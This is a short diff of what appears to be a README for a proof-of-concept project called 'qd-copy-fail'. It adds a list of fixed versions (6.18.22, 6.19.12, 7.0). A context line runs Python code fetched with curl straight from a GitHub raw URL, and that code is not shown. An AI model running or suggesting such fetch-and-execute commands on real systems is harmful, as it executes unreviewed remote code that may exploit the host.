@@ -13,3 +13,8 @@ python3 -c "$(curl https://raw.githubusercontent.com/cs97/qd-copy-fail/refs/head
 ```
 cargo run
 ```
+
+Fixed in versions:
+- 6.18.22
+- 6.19.12
+- 7.0
